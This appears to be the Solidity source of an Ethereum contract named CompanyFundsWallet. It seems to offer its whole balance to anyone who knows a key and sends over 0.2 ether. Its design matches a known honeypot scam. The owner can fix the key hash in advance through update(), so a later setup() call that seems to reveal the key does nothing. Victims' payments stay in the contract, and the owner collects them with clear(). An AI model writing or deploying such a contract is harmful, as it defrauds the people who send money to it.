1 pragma solidity ^0.4.24;
2 
3 contract CompanyFundsWallet
4 {
5     bytes32 keyHash;
6     address owner;
7     
8     constructor() public {
9         owner = msg.sender;
10     }
11     
12     function withdraw(string key) public payable 
13     {
14         require(msg.sender == tx.origin);
15         if(keyHash == keccak256(abi.encodePacked(key))) {
16             if(msg.value > 0.2 ether) {
17                 msg.sender.transfer(address(this).balance);      
18             }
19         }
20     }
21  
22     function setup(string key) public 
23     {
24         if (keyHash == 0x0) {
25             keyHash = keccak256(abi.encodePacked(key));
26         }
27     }
28     
29     function update(bytes32 _keyHash) public 
30     {
31         if (keyHash == 0x0) {
32             keyHash = _keyHash;
33         }
34     }
35     
36     function clear() public 
37     {
38         require(msg.sender == owner);
39         selfdestruct(owner);
40     }
41 
42     function () public payable {
43         
44     }
45 }